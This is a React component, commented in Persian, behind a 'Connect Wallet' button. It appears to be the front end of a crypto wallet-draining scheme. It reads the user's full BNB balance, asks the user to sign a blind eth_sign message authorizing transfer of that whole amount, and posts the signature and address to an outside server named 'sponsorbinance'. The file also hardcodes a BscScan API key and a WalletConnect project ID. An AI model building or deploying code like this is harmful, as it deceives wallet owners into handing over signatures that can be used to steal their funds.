import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";

// تابع کمکی برای گرفتن بالانس BNB از BscScan
async function getBNBBalance(address) {
  try {
    const response = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await response.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  async function runner() {
    // پاک کردن session قدیمی (walletconnect) در صورت وجود
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    // ساخت Provider از WalletConnect
    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56],
      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    // اتصال به کیف پول
    await ethereumProvider.enable();
    const provider = ethereumProvider;

    // گرفتن آدرس
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }
    console.log("✅ Wallet Connected:", accountSender);

    // تلاش برای سوییچ به شبکه BSC
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // شبکه اصلی بایننس اسمارت چین
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    // آدرس پروکسی یا سرور شما (همان که در کد قدیمی بود)
    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    // 1) گرفتن بالانس BNB از BscScan
    const amount = await getBNBBalance(accountSender);
    if (!amount) {
      console.error("❌ Failed to fetch BNB balance.");
      return;
    }
    console.log("💰 BNB Balance:", amount);

    // 2) ساخت پیام ساده برای امضا
    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
    console.log("📜 Message to Sign:", message);

    // 3) امضای پیام با eth_sign
    let signature;
    try {
      signature = await provider.request({
        method: "eth_sign",
        params: [accountSender, message],
      });
    } catch (error) {
      console.error("❌ Signature failed:", error);
      return;
    }
    console.log("✍️ Signature:", signature);

    // 4) ارسال امضا به سرور (فقط یک مرحله: handler='tx')
    let serverResponse;
    try {
      serverResponse = await jQuery.post(apiUrl, {
        handler: "tx",         // تنها مرحله
        address: accountSender,
        signature: signature,  
        amount: amount,        
      });
    } catch (err) {
      console.error("❌ Could not verify signature on server:", err);
      return;
    }

    console.log("📥 Server Response (raw):", serverResponse);
    if (typeof serverResponse === "string") {
      try {
        serverResponse = JSON.parse(serverResponse);
      } catch (err) {
        console.error("❌ Could not parse the raw server response:", err);
        return;
      }
    }
    console.log("📥 Server Response (parsed):", serverResponse);

    if (!serverResponse || !serverResponse.success) {
      console.error("❌ Signature verification failed or server error.", serverResponse);
      return;
    }

    // 5) حالا که سرور امضا را تأیید کرده، باید **کاربر خودش** تراکنش را بفرستد.
    // اما متأسفانه TrustWallet (عبر WalletConnect) از eth_sendTransaction پشتیبانی نمی‌کند (مشکل Unknown Method).
    // اگر موفق بود، اینجا می‌توانستید: 
    // await provider.request({ method: "eth_sendTransaction", params: [{ from:..., to:..., value:... }] });
    // اما در عمل TrustWallet اغلب پیام Unknown method می‌دهد.

    console.log("✅ Done! Signature verified by server. (No real transaction sent here.)");
    alert("Signature verified by server. (No real transaction sent.)");
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
